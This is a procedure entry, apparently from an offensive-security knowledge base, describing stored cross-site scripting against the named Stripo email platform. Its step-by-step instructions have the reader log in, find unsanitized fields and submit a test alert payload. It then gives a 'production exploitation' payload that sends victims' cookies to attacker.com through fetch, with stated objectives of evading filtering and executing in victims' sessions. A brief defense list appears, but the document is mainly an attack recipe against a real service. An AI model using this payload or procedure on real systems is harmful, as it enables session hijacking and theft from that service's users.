---
id: proc-stripo-xss-inject-001
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:30.758Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Input-Parameters

## Summary

This procedure exploits insufficient input sanitization on the Stripo email platform by injecting malicious JavaScript into multiple parameters, such as email template fields or user inputs, allowing the payload to be stored server-side and executed later when viewed.

## Description

The Stripo platform at https://my.stripo.email/ fails to properly escape or sanitize user-supplied inputs in various form fields, enabling attackers with basic access to store cross-site scripting payloads. Once injected, the script persists in the backend (e.g., database or file storage) and executes in the context of any user who views the affected content, such as shared email templates. This can facilitate client-side attacks like stealing authentication tokens or keystrokes from authenticated sessions. Prerequisites include a valid user account; no advanced privileges are needed.

## Requirements

1. Authenticated session on https://my.stripo.email/
2. Access to input forms (e.g., email editor, profile fields)
3. Basic knowledge of JavaScript payloads for XSS

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict script execution
- Sanitize and escape all user inputs using libraries like DOMPurify
- Monitor for anomalous JavaScript in stored content via WAF rules

## Objectives

1. Persist malicious JavaScript in platform storage
2. Ensure payload evades basic filtering
3. Set up for execution in victim contexts

## Instructions

### Step 1: Authenticate and Locate Vulnerable Inputs

**Context**: Log in to identify fields that accept HTML/JS without validation, such as template body or metadata inputs.

Navigate to https://my.stripo.email/ and log in. Explore features like creating email templates or editing user details to find multi-parameter inputs.

### Step 2: Craft and Submit Payload

**Context**: Use a simple test payload to confirm vulnerability, then escalate to a data-exfiltrating one.

In the target input field, enter: `<script>alert('XSS')</script>`. Submit the form (e.g., save template). Reload or view the content to check for execution.

For production exploitation, use: `<script>fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie))</script>`.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored by inspecting the page source or backend responses.

After submission, inspect the HTML source for unescaped script tags. If reflected, the vulnerability is confirmed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
